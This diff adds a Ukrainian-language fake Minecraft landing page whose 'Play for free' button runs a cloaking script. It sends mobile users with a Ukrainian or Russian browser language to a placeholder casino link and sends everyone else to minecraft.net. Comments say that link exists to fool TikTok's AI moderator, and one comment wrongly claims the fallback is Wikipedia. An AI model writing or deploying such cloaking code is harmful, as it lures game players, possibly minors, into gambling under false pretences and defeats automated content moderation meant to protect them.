@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Спільнота</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1e1e1e;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+        }
+        .container {
+            padding: 40px 20px;
+        }
+        .btn {
+            background: #5c8e32;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            border-bottom: 4px solid #3b5c20;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 style="color: #bcbec0;">Новий режим Minecraft 2026</h1>
+        <!-- Твій фінальний текст -->
+        <p>Зіграй та отримай свої спроби на старті гри!</p>
+        
+        <button class="btn" id="startBtn">Грати безкоштовно</button>
+    </div>
+
+    <script>
+        document.getElementById('startBtn').addEventListener('click', function() {
+            // 1. Твоє посилання на казино (встав його всередину лапок)
+            var realOffer = "ВСТАВ_СЮДИ_ПОСИЛАННЯ_НА_КАЗИНО"; 
+            
+            // 2. Біле посилання для ШІ-модератора TikTok
+            var whitePage = "https://www.minecraft.net/"; 
+
+            // Перевірка пристрою (має бути мобільний)
+            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            // Перевірка мови (українська або російська)
+            var userLang = navigator.language.toLowerCase();
+            var isTargetLang = userLang.includes('uk') || userLang.includes('ru');
+
+            if (isMobile && isTargetLang) {
+                // Справжній гравець з України переходить на казино
+                window.location.href = realOffer;
+            } else {
+                // Модератор або бот переходить на Вікіпедію
+                window.location.href = whitePage;
+            }
+        });
+    </script>
+</body>
+</html>
